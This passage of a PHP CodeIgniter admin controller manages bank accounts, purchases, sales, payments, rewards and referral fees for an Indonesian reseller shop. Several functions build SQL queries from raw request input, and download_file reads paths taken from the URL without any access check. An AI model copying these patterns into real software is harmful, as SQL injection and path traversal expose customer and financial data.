                            'no_rekening'=>$this->db->escape_str($this->input->post('b')),
                            'pemilik_rekening'=>$this->db->escape_str($this->input->post('c')));
            }else{
                $data = array('nama_bank'=>$this->db->escape_str($this->input->post('a')),
                            'no_rekening'=>$this->db->escape_str($this->input->post('b')),
                            'pemilik_rekening'=>$this->db->escape_str($this->input->post('c')),
                            'gambar'=>$hasil['file_name']);
            }
            $this->model_app->insert('rb_rekening',$data);
            redirect('administrator/rekening');
        }else{
            $this->template->load('administrator/template','administrator/additional/mod_rekening/view_rekening_tambah');
        }
    }

    function edit_rekening(){
        cek_session_akses('rekening',$this->session->id_session);
        $id = $this->uri->segment(3);
        if (isset($_POST['submit'])){
            $config['upload_path'] = 'asset/images/';
            $config['allowed_types'] = 'gif|jpg|png|JPG|JPEG|swf';
            $config['max_size'] = '5000'; // kb
            $this->load->library('upload', $config);
            $this->upload->do_upload('gambar');
            $hasil=$this->upload->data();
            if ($hasil['file_name']==''){
                $data = array('nama_bank'=>$this->db->escape_str($this->input->post('a')),
                            'no_rekening'=>$this->db->escape_str($this->input->post('b')),
                            'pemilik_rekening'=>$this->db->escape_str($this->input->post('c')));
            }else{
                $data = array('nama_bank'=>$this->db->escape_str($this->input->post('a')),
                            'no_rekening'=>$this->db->escape_str($this->input->post('b')),
                            'pemilik_rekening'=>$this->db->escape_str($this->input->post('c')),
                            'gambar'=>$hasil['file_name']);
            }
            $where = array('id_rekening' => $this->input->post('id'));
            $this->model_app->update('rb_rekening', $data, $where);
            redirect('administrator/rekening');
        }else{
            $data['rows'] = $this->model_app->edit('rb_rekening',array('id_rekening'=>$id))->row_array();
            $this->template->load('administrator/template','administrator/additional/mod_rekening/view_rekening_edit',$data);
        }
    }

    function delete_rekening(){
        cek_session_akses('rekening',$this->session->id_session);
        $id = array('id_rekening' => $this->uri->segment(3));
        $this->model_app->delete('rb_rekening',$id);
        redirect('administrator/rekening');
    }


    // Controller Modul Setting Bonus

    function settingbonus(){
        cek_session_akses('settingbonus',$this->session->id_session);
        if (isset($_POST['submit'])){
            $data = array('referral'=>$this->input->post('aa'),
                            'tanggal_pencairan'=>$this->input->post('bb'));
            $where = array('id_setting' => $this->input->post('id'));
            $this->model_app->update('rb_setting', $data, $where);
            redirect('administrator/settingbonus');
        }elseif (isset($_POST['submit2'])){
            if ($this->input->post('idr')==''){
                $data = array('posisi'=>$this->input->post('a'),
                              'reward'=>$this->input->post('b'));
                $this->model_app->insert('rb_reward',$data);
            }else{
                $data = array('posisi'=>$this->input->post('a'),
                              'reward'=>$this->input->post('b'));
                $where = array('id_reward' => $this->input->post('idr'));
                $this->model_app->update('rb_reward', $data, $where);
            }
            redirect('administrator/settingbonus');
        }else{
            $data['record'] = $this->model_app->edit('rb_setting',array('aktif'=>'Y'))->row_array();
            $data['reward'] = $this->model_app->view_ordering('rb_reward','id_reward','ASC');
            if ($this->uri->segment(3)!=''){
                $data['rows'] = $this->model_app->edit('rb_reward',array('id_reward'=>$this->uri->segment(3)))->row_array();
            }
            $this->template->load('administrator/template','administrator/additional/mod_settingbonus/view_settingbonus',$data);
        }
    }

    function delete_reward(){
        cek_session_akses('settingbonus',$this->session->id_session);
        $id = array('id_reward' => $this->uri->segment(3));
        $this->model_app->delete('rb_reward',$id);
        redirect('administrator/settingbonus');
    }



    // Controller Modul Pembelian

    function pembelian(){
        cek_session_akses('pembelian',$this->session->id_session);
        $this->session->unset_userdata('idp');
        $data['record'] = $this->model_app->view_join_one('rb_pembelian','rb_supplier','id_supplier','id_pembelian','DESC');
        $this->template->load('administrator/template','administrator/additional/mod_pembelian/view_pembelian',$data);
    }

    function detail_pembelian(){
        cek_session_akses('pembelian',$this->session->id_session);
        $data['rows'] = $this->model_reseller->view_join_rows('rb_pembelian','rb_supplier','id_supplier',array('id_pembelian'=>$this->uri->segment(3)),'id_pembelian','DESC')->row_array();
        $data['record'] = $this->model_app->view_join_where('rb_pembelian_detail','rb_produk','id_produk',array('id_pembelian'=>$this->uri->segment(3)),'id_pembelian_detail','DESC');
        $this->template->load('administrator/template','administrator/additional/mod_pembelian/view_pembelian_detail',$data);
    }

    function tambah_pembelian(){
        cek_session_akses('pembelian',$this->session->id_session);
        if (isset($_POST['submit1'])){
            if ($this->session->idp == ''){
                $data = array('kode_pembelian'=>$this->input->post('a'),
                              'id_supplier'=>$this->input->post('b'),
                              'waktu_beli'=>date('Y-m-d H:i:s'));
                $this->model_app->insert('rb_pembelian',$data);
                $idp = $this->db->insert_id();
                $this->session->set_userdata(array('idp'=>$idp));
            }else{
                $data = array('kode_pembelian'=>$this->input->post('a'),
                              'id_supplier'=>$this->input->post('b'));
                $where = array('id_pembelian' => $this->session->idp);
                $this->model_app->update('rb_pembelian', $data, $where);
            }
            redirect('administrator/tambah_pembelian');

        }elseif(isset($_POST['submit'])){
            if ($this->input->post('idpd')==''){
                $data = array('id_pembelian'=>$this->session->idp,
                              'id_produk'=>$this->input->post('aa'),
                              'harga_pesan'=>$this->input->post('bb'),
                              'jumlah_pesan'=>$this->input->post('cc'),
                              'satuan'=>$this->input->post('dd'));
                $this->model_app->insert('rb_pembelian_detail',$data);
            }else{
                $data = array('id_produk'=>$this->input->post('aa'),
                              'harga_pesan'=>$this->input->post('bb'),
                              'jumlah_pesan'=>$this->input->post('cc'),
                              'satuan'=>$this->input->post('dd'));
                $where = array('id_pembelian_detail' => $this->input->post('idpd'));
                $this->model_app->update('rb_pembelian_detail', $data, $where);
            }
            redirect('administrator/tambah_pembelian');
        }else{
            $data['rows'] = $this->model_reseller->view_join_rows('rb_pembelian','rb_supplier','id_supplier',array('id_pembelian'=>$this->session->idp),'id_pembelian','DESC')->row_array();
            $data['record'] = $this->model_app->view_join_where('rb_pembelian_detail','rb_produk','id_produk',array('id_pembelian'=>$this->session->idp),'id_pembelian_detail','DESC');
            $data['barang'] = $this->model_app->view_where_ordering('rb_produk',array('id_reseller'=>'0'),'id_produk','ASC');
            $data['supplier'] = $this->model_app->view_ordering('rb_supplier','id_supplier','ASC');
            if ($this->uri->segment(3)!=''){
                $data['row'] = $this->model_app->view_where('rb_pembelian_detail',array('id_pembelian_detail'=>$this->uri->segment(3)))->row_array();
            }
            $this->template->load('administrator/template','administrator/additional/mod_pembelian/view_pembelian_tambah',$data);
        }
    }

    function edit_pembelian(){
        cek_session_akses('pembelian',$this->session->id_session);
        if (isset($_POST['submit1'])){
            $data = array('kode_pembelian'=>$this->input->post('a'),
                          'id_supplier'=>$this->input->post('b'),
                          'waktu_beli'=>$this->input->post('c'));
            $where = array('id_pembelian' => $this->input->post('idp'));
            $this->model_app->update('rb_pembelian', $data, $where);
            redirect('administrator/edit_pembelian/'.$this->input->post('idp'));

        }elseif(isset($_POST['submit'])){
            if ($this->input->post('idpd')==''){
                $data = array('id_pembelian'=>$this->input->post('idp'),
                              'id_produk'=>$this->input->post('aa'),
                              'harga_pesan'=>$this->input->post('bb'),
                              'jumlah_pesan'=>$this->input->post('cc'),
                              'satuan'=>$this->input->post('dd'));
                $this->model_app->insert('rb_pembelian_detail',$data);
            }else{
                $data = array('id_produk'=>$this->input->post('aa'),
                              'harga_pesan'=>$this->input->post('bb'),
                              'jumlah_pesan'=>$this->input->post('cc'),
                              'satuan'=>$this->input->post('dd'));
                $where = array('id_pembelian_detail' => $this->input->post('idpd'));
                $this->model_app->update('rb_pembelian_detail', $data, $where);
            }
            redirect('administrator/edit_pembelian/'.$this->input->post('idp'));
        }else{
            $data['rows'] = $this->model_reseller->view_join_rows('rb_pembelian','rb_supplier','id_supplier',array('id_pembelian'=>$this->uri->segment(3)),'id_pembelian','DESC')->row_array();
            $data['record'] = $this->model_app->view_join_where('rb_pembelian_detail','rb_produk','id_produk',array('id_pembelian'=>$this->uri->segment(3)),'id_pembelian_detail','DESC');
            $data['barang'] = $this->model_app->view_where_ordering('rb_produk',array('id_reseller'=>'0'),'id_produk','ASC');
            $data['supplier'] = $this->model_app->view_ordering('rb_supplier','id_supplier','ASC');
            if ($this->uri->segment(4)!=''){
                $data['row'] = $this->model_app->view_where('rb_pembelian_detail',array('id_pembelian_detail'=>$this->uri->segment(4)))->row_array();
            }
            $this->template->load('administrator/template','administrator/additional/mod_pembelian/view_pembelian_edit',$data);
        }
    }

    function delete_pembelian(){
        cek_session_akses('pembelian',$this->session->id_session);
        $id = array('id_pembelian' => $this->uri->segment(3));
        $this->model_app->delete('rb_pembelian',$id);
        $this->model_app->delete('rb_pembelian_detail',$id);
        redirect('administrator/pembelian');
    }

    function delete_pembelian_detail(){
        cek_session_akses('pembelian',$this->session->id_session);
        $id = array('id_pembelian_detail' => $this->uri->segment(4));
        $this->model_app->delete('rb_pembelian_detail',$id);
        redirect('administrator/edit_pembelian/'.$this->uri->segment(3));
    }

    function delete_pembelian_tambah_detail(){
        cek_session_akses('pembelian',$this->session->id_session);
        $id = array('id_pembelian_detail' => $this->uri->segment(3));
        $this->model_app->delete('rb_pembelian_detail',$id);
        redirect('administrator/tambah_pembelian');
    }



    // Controller Modul Penjualan

    function penjualan(){
        cek_session_akses('penjualan',$this->session->id_session);
        $this->session->unset_userdata('idp');
        $data['record'] = $this->model_reseller->penjualan_list(1,'admin');
        $this->template->load('administrator/template','administrator/additional/mod_penjualan/view_penjualan',$data);
    }

    function detail_penjualan(){
        cek_session_akses('penjualan',$this->session->id_session);
        $data['rows'] = $this->model_reseller->penjualan_detail($this->uri->segment(3))->row_array();
        $data['record'] = $this->model_app->view_join_where('rb_penjualan_detail','rb_produk','id_produk',array('id_penjualan'=>$this->uri->segment(3)),'id_penjualan_detail','DESC');
        $this->template->load('administrator/template','administrator/additional/mod_penjualan/view_penjualan_detail',$data);
    }

    function tambah_penjualan(){
        cek_session_akses('penjualan',$this->session->id_session);
        if (isset($_POST['submit1'])){
            if ($this->session->idp == ''){
                $data = array('kode_transaksi'=>$this->input->post('a'),
                              'id_pembeli'=>$this->input->post('b'),
                              'id_penjual'=>0,
                              'status_pembeli'=>'reseller',
                              'status_penjual'=>'admin',
                              'waktu_transaksi'=>date('Y-m-d H:i:s'),
                              'proses'=>'0');
                $this->model_app->insert('rb_penjualan',$data);
                $idp = $this->db->insert_id();
                $this->session->set_userdata(array('idp'=>$idp));
            }else{
                $data = array('kode_transaksi'=>$this->input->post('a'),
                              'id_pembeli'=>$this->input->post('b'));
                $where = array('id_penjualan' => $this->session->idp);
                $this->model_app->update('rb_penjualan', $data, $where);
            }
                redirect('administrator/tambah_penjualan');

        }elseif(isset($_POST['submit'])){
            $jual = $this->model_reseller->jual($this->input->post('aa'))->row_array();
            $beli = $this->model_reseller->beli($this->input->post('aa'))->row_array();
            $stok = $beli['beli']-$jual['jual'];
            if ($this->input->post('dd') > $stok){
                echo "<script>window.alert('Maaf, Stok Tidak Mencukupi!');
                                  window.location=('".base_url()."administrator/tambah_penjualan')</script>";
            }else{
                if ($this->input->post('idpd')==''){
                    $data = array('id_penjualan'=>$this->session->idp,
                                  'id_produk'=>$this->input->post('aa'),
                                  'jumlah'=>$this->input->post('dd'),
                                  'diskon'=>$this->input->post('cc'),
                                  'harga_jual'=>$this->input->post('bb'),
                                  'satuan'=>$this->input->post('ee'));
                    $this->model_app->insert('rb_penjualan_detail',$data);
                }else{
                    $data = array('id_produk'=>$this->input->post('aa'),
                                  'jumlah'=>$this->input->post('dd'),
                                  'diskon'=>$this->input->post('cc'),
                                  'harga_jual'=>$this->input->post('bb'),
                                  'satuan'=>$this->input->post('ee'));
                    $where = array('id_penjualan_detail' => $this->input->post('idpd'));
                    $this->model_app->update('rb_penjualan_detail', $data, $where);
                }
                redirect('administrator/tambah_penjualan');
            }
            
        }else{
            $data['rows'] = $this->model_reseller->penjualan_detail($this->session->idp)->row_array();
            $data['record'] = $this->model_app->view_join_where('rb_penjualan_detail','rb_produk','id_produk',array('id_penjualan'=>$this->session->idp),'id_penjualan_detail','DESC');
            $data['barang'] = $this->model_app->view_ordering('rb_produk','id_produk','ASC');
            $data['reseller'] = $this->model_app->view_ordering('rb_reseller','id_reseller','ASC');
            if ($this->uri->segment(3)!=''){
                $data['row'] = $this->model_app->view_where('rb_penjualan_detail',array('id_penjualan_detail'=>$this->uri->segment(3)))->row_array();
            }
            $this->template->load('administrator/template','administrator/additional/mod_penjualan/view_penjualan_tambah',$data);
        }
    }

    function edit_penjualan(){
        cek_session_akses('penjualan',$this->session->id_session);
        if (isset($_POST['submit1'])){
            $data = array('kode_transaksi'=>$this->input->post('a'),
                          'id_pembeli'=>$this->input->post('b'),
                          'waktu_transaksi'=>$this->input->post('c'));
            $where = array('id_penjualan' => $this->input->post('idp'));
            $this->model_app->update('rb_penjualan', $data, $where);
            redirect('administrator/edit_penjualan/'.$this->input->post('idp'));

        }elseif(isset($_POST['submit'])){
            $cekk = $this->db->query("SELECT * FROM rb_penjualan_detail where id_penjualan='".$this->input->post('idp')."' AND id_produk='".$this->input->post('aa')."'")->row_array();
            $jual = $this->model_reseller->jual($this->input->post('aa'))->row_array();
            $beli = $this->model_reseller->beli($this->input->post('aa'))->row_array();
            $stok = $beli['beli']-$jual['jual']+$cekk['jumlah'];
            if ($this->input->post('dd') > $stok){
                echo "<script>window.alert('Maaf, Stok Tidak Mencukupi!');
                                  window.location=('".base_url()."administrator/edit_penjualan/".$this->input->post('idp')."')</script>";
            }else{
                if ($this->input->post('idpd')==''){
                    $data = array('id_penjualan'=>$this->input->post('idp'),
                                  'id_produk'=>$this->input->post('aa'),
                                  'jumlah'=>$this->input->post('dd'),
                                  'diskon'=>$this->input->post('cc'),
                                  'harga_jual'=>$this->input->post('bb'),
                                  'satuan'=>$this->input->post('ee'));
                    $this->model_app->insert('rb_penjualan_detail',$data);
                }else{
                    $data = array('id_produk'=>$this->input->post('aa'),
                                  'jumlah'=>$this->input->post('dd'),
                                  'diskon'=>$this->input->post('cc'),
                                  'harga_jual'=>$this->input->post('bb'),
                                  'satuan'=>$this->input->post('ee'));
                    $where = array('id_penjualan_detail' => $this->input->post('idpd'));
                    $this->model_app->update('rb_penjualan_detail', $data, $where);
                }
                redirect('administrator/edit_penjualan/'.$this->input->post('idp'));
            }
            
        }else{
            $data['rows'] = $this->model_reseller->penjualan_detail($this->uri->segment(3))->row_array();
            $data['record'] = $this->model_app->view_join_where('rb_penjualan_detail','rb_produk','id_produk',array('id_penjualan'=>$this->uri->segment(3)),'id_penjualan_detail','DESC');
            $data['barang'] = $this->model_app->view_ordering('rb_produk','id_produk','ASC');
            $data['reseller'] = $this->model_app->view_ordering('rb_reseller','id_reseller','ASC');
            if ($this->uri->segment(4)!=''){
                $data['row'] = $this->model_app->view_where('rb_penjualan_detail',array('id_penjualan_detail'=>$this->uri->segment(4)))->row_array();
            }
            $this->template->load('administrator/template','administrator/additional/mod_penjualan/view_penjualan_edit',$data);
        }
    }

    function proses_penjualan(){
        cek_session_akses('penjualan',$this->session->id_session);
            $data = array('proses'=>$this->uri->segment(4));
            $where = array('id_penjualan' => $this->uri->segment(3));
            $this->model_app->update('rb_penjualan', $data, $where);

            $order = $this->db->query("SELECT a.*, b.id_pembeli, b.kode_transaksi FROM rb_penjualan_detail a JOIN rb_penjualan b ON a.id_penjualan=b.id_penjualan where a.id_penjualan='".$this->uri->segment(3)."'");
            foreach ($order->result_array() as $row) {
                $cek_produk = $this->db->query("SELECT * FROM rb_produk where id_produk_perusahaan='$row[id_produk]' AND id_reseller='$row[id_pembeli]'");
                if ($cek_produk->num_rows()>=1){
                    $pro = $cek_produk->row_array();
                    $kode_transaksi = "TRX-".date('YmdHis');
                    $data = array('kode_transaksi'=>$kode_transaksi,
                                  'id_pembeli'=>$row['id_pembeli'],
                                  'id_penjual'=>'1',
                                  'status_pembeli'=>'reseller',
                                  'status_penjual'=>'admin',
                                  'service'=>$row['kode_transaksi'],
                                  'waktu_transaksi'=>date('Y-m-d H:i:s'),
                                  'proses'=>'4');
                    $this->model_app->insert('rb_penjualan',$data);
                    $idp = $this->db->insert_id();

                    $data = array('id_penjualan'=>$idp,
                                  'id_produk'=>$pro['id_produk'],
                                  'jumlah'=>$row['jumlah'],
                                  'harga_jual'=>$row['harga_jual'],
                                  'satuan'=>$row['satuan']);
                    $this->model_app->insert('rb_penjualan_detail',$data);
                }else{
                    $p = $this->db->query("SELECT * FROM rb_produk where id_produk='$row[id_produk]'")->row_array();
                    $produk_seo = $p['produk_seo'].'-'.date('YmdHis');
                    $data = array('id_produk_perusahaan'=>$p['id_produk'],
                                  'id_kategori_produk'=>$p['id_kategori_produk'],
                                  'id_kategori_produk_sub'=>$p['id_kategori_produk_sub'],
                                  'id_reseller'=>$row['id_pembeli'],
                                  'nama_produk'=>$p['nama_produk'],
                                  'produk_seo'=>$produk_seo,
                                  'satuan'=>$p['satuan'],
                                  'harga_beli'=>$p['harga_beli'],
                                  'harga_reseller'=>$p['harga_reseller'],
                                  'harga_konsumen'=>$p['harga_konsumen'],
                                  'berat'=>$p['berat'],
                                  'gambar'=>$p['gambar'],
                                  'tentang_produk'=>$p['tentang_produk'],
                                  'keterangan'=>$p['keterangan'],
                                  'username'=>$p['username'],
                                  'waktu_input'=>date('Y-m-d H:i:s'));
                    $this->model_app->insert('rb_produk',$data);
                    $id_produk = $this->db->insert_id();

                    $kode_transaksi = "TRX-".date('YmdHis');
                    $data = array('kode_transaksi'=>$kode_transaksi,
                                  'id_pembeli'=>$row['id_pembeli'],
                                  'id_penjual'=>'1',
                                  'status_pembeli'=>'reseller',
                                  'status_penjual'=>'admin',
                                  'service'=>$row['kode_transaksi'],
                                  'waktu_transaksi'=>date('Y-m-d H:i:s'),
                                  'proses'=>'4');
                    $this->model_app->insert('rb_penjualan',$data);
                    $idp = $this->db->insert_id();

                    $data = array('id_penjualan'=>$idp,
                                  'id_produk'=>$id_produk,
                                  'jumlah'=>$row['jumlah'],
                                  'harga_jual'=>$row['harga_jual'],
                                  'satuan'=>$row['satuan']);
                    $this->model_app->insert('rb_penjualan_detail',$data);
                }
            }

            redirect('administrator/penjualan');
    }

    function proses_penjualan_detail(){
        cek_session_akses('penjualan',$this->session->id_session);
        $data = array('proses'=>$this->uri->segment(4));
        $where = array('id_penjualan' => $this->uri->segment(3));
        $this->model_app->update('rb_penjualan', $data, $where);
        redirect('administrator/detail_penjualan/'.$this->uri->segment(3));
    }

    function delete_penjualan(){
        cek_session_akses('penjualan',$this->session->id_session);
        $id = array('id_penjualan' => $this->uri->segment(3));
        $this->model_app->delete('rb_penjualan',$id);
        $this->model_app->delete('rb_penjualan_detail',$id);
        redirect('administrator/penjualan');
    }

    function delete_penjualan_detail(){
        cek_session_akses('penjualan',$this->session->id_session);
        $id = array('id_penjualan_detail' => $this->uri->segment(4));
        $this->model_app->delete('rb_penjualan_detail',$id);
        redirect('administrator/edit_penjualan/'.$this->uri->segment(3));
    }

    function delete_penjualan_tambah_detail(){
        cek_session_akses('penjualan',$this->session->id_session);
        $id = array('id_penjualan_detail' => $this->uri->segment(3));
        $this->model_app->delete('rb_penjualan_detail',$id);
        redirect('administrator/tambah_penjualan');
    }

    function pembayaran_reseller(){
        cek_session_akses('konsumen',$this->session->id_session);
        $data['record'] = $this->db->query("SELECT a.*, b.*, c.kode_transaksi, c.proses FROM `rb_konfirmasi_pembayaran` a JOIN rb_rekening b ON a.id_rekening=b.id_rekening JOIN rb_penjualan c ON a.id_penjualan=c.id_penjualan ORDER BY a.id_konfirmasi_pembayaran DESC");
        $this->template->load('administrator/template','administrator/additional/mod_reseller/view_reseller_pembayaran',$data);
    }

    function download_bukti(){
        cek_session_akses('pembayaran_reseller',$this->session->id_session);
        $name = $this->uri->segment(3);
        $data = file_get_contents("asset/files/".$name);
        force_download($name, $data);
    }

    function download_file(){
        $name = $this->uri->segment(4);
        $data = file_get_contents("asset/".$this->uri->segment(3)."/".$name);
        force_download($name, $data);
    }

    function keuangan(){
        cek_session_akses('keuangan',$this->session->id_session);
        $data['record'] = $this->model_app->view_ordering('rb_reseller','id_reseller','DESC');
        $this->template->load('administrator/template','administrator/additional/mod_keuangan/view_keuangan',$data);
    }

    function bayar_bonus(){
        cek_session_akses('keuangan',$this->session->id_session);
        if (isset($_POST['submit'])){
            $data = array('id_reseller'=>$this->input->post('idk'),
                            'bonus_referral'=>$this->input->post('a'),
                            'waktu_pencairan'=>date('YmdHis'));
            $this->model_app->insert('rb_pencairan_bonus',$data);
            redirect('administrator/bayar_bonus/'.$this->input->post('idk'));
        }else{
            $id = $this->uri->segment(3);
            $record = $this->model_reseller->reseller_pembelian($id,'admin');
            $penjualan = $this->model_reseller->penjualan_list_konsumen($id,'reseller');
            $edit = $this->model_app->edit('rb_reseller',array('id_reseller'=>$id))->row_array();
            $reward = $this->model_app->view_ordering('rb_reward','id_reward','ASC');

            $data = array('rows' => $edit,'record'=>$record,'penjualan'=>$penjualan,'reward'=>$reward);
            $this->template->load('administrator/template','administrator/additional/mod_keuangan/view_bayar_bonus',$data);
        }
    }

    function bayar_reward(){
        cek_session_akses('keuangan',$this->session->id_session);
        $data = array('id_reseller'=>$this->uri->segment(3),
                        'id_reward'=>$this->uri->segment(4),
                        'reward_date'=>$this->uri->segment(5),
                        'waktu_pencairan'=>date('YmdHis'));
        $this->model_app->insert('rb_pencairan_reward',$data);
        redirect('administrator/bayar_bonus/'.$this->uri->segment(3));
    }

    function batalkan_reward(){
        cek_session_akses('keuangan',$this->session->id_session);
        $id = array('id_konsumen' => $this->uri->segment(4),'id_reward' => $this->uri->segment(3));
        $this->model_app->delete('rb_pencairan_reward',$id);
        redirect('administrator/bayar_bonus/'.$this->uri->segment(4));
    }

    function history_reward(){
        cek_session_akses('keuangan',$this->session->id_session);
        $data['record'] = $this->db->query("SELECT a.*, b.nama_reseller, c.posisi, c.reward FROM `rb_pencairan_reward` a JOIN rb_reseller b ON a.id_reseller=b.id_reseller JOIN rb_reward c ON a.id_reward=c.id_reward ORDER BY a.id_pencairan_reward DESC");
        $this->template->load('administrator/template','administrator/additional/mod_keuangan/view_history_reward',$data);
    }

    function history_referral(){
        cek_session_akses('keuangan',$this->session->id_session);
        $data['record'] = $this->db->query("SELECT a.*, b.nama_reseller FROM `rb_pencairan_bonus` a JOIN rb_reseller b ON a.id_reseller=b.id_reseller ORDER BY a.id_pencairan_bonus DESC");
        $this->template->load('administrator/template','administrator/additional/mod_keuangan/view_history_referral',$data);
    }

    function delete_history_reward(){
        cek_session_akses('keuangan',$this->session->id_session);
        $id = array('id_pencairan_reward' => $this->uri->segment(3));
        $this->model_app->delete('rb_pencairan_reward',$id);
        redirect('administrator/history_reward');
    }

    function delete_history_referral(){
        cek_session_akses('keuangan',$this->session->id_session);
        $id = array('id_pencairan_bonus' => $this->uri->segment(3));
        $this->model_app->delete('rb_pencairan_bonus',$id);
        redirect('administrator/history_referral');
    }

    function testimoni(){
        cek_session_akses('testimoni',$this->session->id_session);
        $data['record'] = $this->db->query("SELECT a.*, b.nama_lengkap, b.username, b.id_konsumen FROM testimoni a JOIN rb_konsumen b ON a.id_konsumen=b.id_konsumen ORDER BY a.id_testimoni DESC");
        $this->template->load('administrator/template','administrator/mod_testimoni/view_testimoni',$data);
    }

    function edit_testimoni(){
        cek_session_akses('testimoni',$this->session->id_session);
        $id = $this->uri->segment(3);
        if (isset($_POST['submit'])){
            $data = array('isi_testimoni'=>$this->input->post('b'),
                                'aktif'=>$this->input->post('f'));
                $where = array('id_testimoni' => $this->input->post('id'));
                $this->model_app->update('testimoni', $data, $where);
            redirect('administrator/testimoni');
        }else{
            $data['rows'] = $this->db->query("SELECT a.*, b.nama_lengkap, b.username, b.id_konsumen FROM testimoni a LEFT JOIN rb_konsumen b ON a.id_konsumen=b.id_konsumen where a.id_testimoni='$id'")->row_array();
            $this->template->load('administrator/template','administrator/mod_testimoni/view_testimoni_edit',$data);
        }
    }

    function delete_testimoni(){
        cek_session_akses('testimoni',$this->session->id_session);
        $id = array('id_testimoni' => $this->uri->segment(3));
        $this->model_app->delete('testimoni',$id);
        redirect('administrator/testimoni');
    }

    function pembayaran_konsumen(){
        cek_session_akses('pembayaran_konsumen',$this->session->id_session);
        if ($this->uri->segment(3)!=''){
            $rows = $this->model_app->view_where('rb_penjualan',array('id_penjualan' => $this->uri->segment(3)))->row_array();

            $data = array('proses'=>$this->uri->segment(4));
            $where = array('kode_transaksi' => $rows['kode_transaksi']);
            $this->model_app->update('rb_penjualan', $data, $where);

            $dataa = array('pembayaran'=>($this->uri->segment(4)=='0' ? NULL : $this->uri->segment(4)));
            $wheree = array('kode_transaksi' => $rows['kode_transaksi']);
            $this->model_app->update('rb_penjualan_otomatis', $dataa, $wheree);

            if ($this->uri->segment(4)!='0'){
                $logo = $this->db->query("SELECT * FROM logo ORDER BY id_logo DESC LIMIT 1")->row_array();
                $iden = $this->db->query("SELECT * FROM identitas where id_identitas='1'")->row_array();
                $cek_kons = $this->db->query("SELECT b.id_pembeli FROM rb_penjualan_otomatis a JOIN rb_penjualan b ON a.kode_transaksi=b.kode_transaksi where b.status_pembeli='konsumen' AND a.kode_transaksi='$rows[kode_transaksi]' GROUP BY b.id_pembeli")->row_array();
                $kons = $this->model_reseller->profile_konsumen($cek_kons['id_pembeli'])->row_array();
                $subject      = "$iden[pengirim_email] - Pembayaran Sukses,..";
                $message  = "<html><body><img src='".base_url()."asset/logo/$logo[gambar]' style='height:87px'><br>
                                        <span style='font-size:18px; color:green'>Selamat Pembayaran anda Sukses.</span><br>
                                        Hai $kons[nama_lengkap]! Kami telah menerima pembayaran untuk pesanan anda #$rows[kode_transaksi]. <br>
                                        Kami juga telah menginformasikan kepada penjual agar segera memproses pesanannya.<br> 
                                        Silahkan cek disini untuk perkembangan status pesanan : <a href='".base_url()."konfirmasi/tracking/$rows[kode_transaksi]'>Disini</a>.<br><br>

                                        Terima kasih telah berbelanja di $iden[url].</body></html> \n";
                echo kirim_email($subject,$message,$kons['email']);


                $penjual = $this->db->query("SELECT b.id_penjual FROM rb_penjualan_otomatis a JOIN rb_penjualan b ON a.kode_transaksi=b.kode_transaksi where b.status_pembeli='konsumen' AND a.kode_transaksi='$rows[kode_transaksi]' AND b.kode_kurir!='0' GROUP BY b.id_penjual");
                foreach ($penjual->result_array() as $row){
                    $subject_ress      = "$iden[pengirim_email] - Pembayaran dari Pembeli Sukses,..";
                    $ress = $this->db->query("SELECT * FROM rb_reseller where id_reseller='$row[id_penjual]'")->row_array();

                    $message_ress  = "<html><body><img src='".base_url()."asset/logo/$logo[gambar]' style='height:87px'><br>
                                            <span style='font-size:18px; color:green'>Selamat Pembayaran dari pembeli Sukses.</span><br>
                                            Hai $ress[nama_reseller]! Kami telah menerima pembayaran pesanan dari konsumen anda untuk Invoice <a href='".base_url()."konfirmasi/tracking/$rows[kode_transaksi]'>#$rows[kode_transaksi]</a>. <br>
                                            Kami juga telah menginformasikan kepada konsumen agar anda segera memproses pesanannya.<br> 
                                            Silahkan login ke akun anda dan proses pesanan konsumen segera, Terima kasih.<br><br>

                                            Terima kasih telah berjualan di $iden[url].</body></html> \n";
                    echo kirim_email($subject_ress,$message_ress,$ress['email']);
                }
            }
            redirect('administrator/pembayaran_konsumen');
        }
        $data['record'] = $this->db->query("SELECT a.*, b.*, c.id_penjualan, c.kode_transaksi, c.proses FROM `rb_konfirmasi_pembayaran_konsumen` a JOIN rb_rekening b ON a.id_rekening=b.id_rekening JOIN rb_penjualan c ON a.kode_transaksi=c.kode_transaksi where c.status_penjual='reseller' GROUP BY c.kode_transaksi ORDER BY a.id_konfirmasi_pembayaran DESC");
        $this->template->load($this->uri->segment(1).'/template',$this->uri->segment(1).'/additional/mod_konsumen/view_konsumen_pembayaran',$data);
    }

    function penjualan_konsumen(){
        cek_session_akses('pembayaran_konsumen',$this->session->id_session);
        // Transaksi sudah selesai/sukses
        if (isset($_GET['sukses'])){
			$data = array('proses'=>'4');
			$where = array('id_penjualan'=>$this->input->get('sukses'),'status_pembeli'=>'konsumen');
            $this->model_app->update('rb_penjualan', $data, $where);

			// Cek Referral, jika ada maka masukkan fee ke referral
			$ref = $this->db->query("SELECT a.kode_transaksi, a.id_penjual, b.nama_reseller, b.referral FROM rb_penjualan a JOIN rb_reseller b ON a.id_penjual=b.id_reseller where a.id_penjualan='".$this->input->get('sukses')."' AND a.status_penjual='reseller'")->row_array();
            if ($ref['referral']!='' AND $ref['referral']!='0'){
				$row = $this->db->query("SELECT sum(b.harga_beli*a.jumlah) as modal, sum((a.harga_jual-a.diskon)*a.jumlah) as total, (sum((a.harga_jual-a.diskon)*a.jumlah)-sum(b.harga_beli*a.jumlah)) as untung FROM `rb_penjualan_detail` a JOIN rb_produk b ON a.id_produk=b.id_produk where a.id_penjualan='".$this->input->get('sukses')."'")->row_array();
				if ($row['untung']>0){
					$cekfee = $this->db->query("SELECT * FROM rb_setting where aktif='Y'")->row_array();
					$fee_rupiah = $cekfee['referral']/100*$row['untung'];
					$data = array('id_rekening_reseller'=>0,
							'id_reseller'=>$ref['referral'],
							'nominal'=>$fee_rupiah,
							'status'=>'Sukses',
							'transaksi'=>'Kredit',
							'keterangan'=>"$ref[kode_transaksi] - Fee $cekfee[referral]%",
							'akun'=>'konsumen',
							'waktu_withdraw'=>date('Y-m-d H:i:s'));
                    $this->model_app->insert('rb_withdraw',$data);
                    
                    $data_fee = array('id_rekening_reseller'=>0,
							'id_reseller'=>$ref['id_penjual'],
							'nominal'=>$fee_rupiah,
							'status'=>'Sukses',
							'transaksi'=>'Debit',
							'keterangan'=>"$ref[kode_transaksi] - Fee $cekfee[referral]%",
							'akun'=>'konsumen',
							'waktu_withdraw'=>date('Y-m-d H:i:s'));
					$this->model_app->insert('rb_withdraw',$data_fee);
				}
			}
			redirect('administrator/penjualan_konsumen');
        }

        // Transaksi Pending, Proses, Konfirmasi, Dikirim
